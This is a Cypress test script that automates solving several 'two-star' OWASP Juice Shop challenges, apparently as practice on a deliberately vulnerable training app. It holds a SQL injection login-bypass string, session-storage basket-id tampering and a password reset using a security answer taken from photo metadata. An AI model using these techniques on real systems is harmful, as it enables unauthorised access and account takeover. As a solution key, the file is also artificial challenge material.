import firstVisitPopups from '../POM/FirstVisitPopups.pom';
import headerBar from '../POM/headerBar.pom';
import loginPage from '../POM/loginPage.pom';
import scoreBoard from '../POM/ScoreBoard.pom';

describe('OWASP JuiceShop Achivments unlocking Automation', () => {
  context('2 - stars vulnerabilities', () => {

    before(() => {
      cy.visit('/');
      cy.wait(2000);
      firstVisitPopups.closeFirstVisitMesseges();
    });

    beforeEach(() => {
      Cypress.Cookies.preserveOnce('cookieconsent_status', 'welcomebanner_status', 'language');
      cy.visit('/');
    });

    it('1 - Login Admin', () => {
      loginPage.login("' OR '1'='1'--", " ");
      scoreBoard.checkIsAchivSolvedXHR('Login Admin');
    });

    it('2 - Admin Section', () => {
      //path found in main-es2018.js file
      cy.visit('/#/administration');
      scoreBoard.checkIsAchivSolvedXHR('Admin Section');
    });

    it('3 - View Basket', () => {
      loginPage.login("' OR '1'='1'--", " ");
      headerBar.basketButon().click();
      cy.window()
        .its("sessionStorage").then((storage) => {
          storage.bid = 2;
        });
      cy.reload();
      scoreBoard.checkIsAchivSolvedXHR('View Basket');
    });

    it('4 - Get rid of all 5-star customer feedback', () => {
      loginPage.login("' OR '1'='1'--", " ");
      cy.visit('/#/administration');
      cy.get("div[class='customer-table'] mat-row").each((customerFeedback) => {
        if(customerFeedback.find("mat-icon").length === 5){
          customerFeedback.find("button").click();
        }
      });
      scoreBoard.checkIsAchivSolvedXHR('Five-Star Feedback');
    });

    it('5 - Meta Geo Stalking', () => {
      //used meta data from Photo Wall img and admin section(email)
      const newPassword = 'newPassword123.';
      const securityAnswer = 'Daniel Boone National Forest';
      const johnEmail = 'john@juice-sh.op';
      cy.visit('#/forgot-password');
      cy.get("[id='email']").type(johnEmail);
      cy.get("[id='securityAnswer']").type(securityAnswer);
      cy.get("[id='newPassword']").type(newPassword);
      cy.get("[id='newPasswordRepeat']").type(newPassword);
      cy.get("[id='resetButton']").click();
      scoreBoard.checkIsAchivSolvedXHR('Meta Geo Stalking');
    });
  });
});
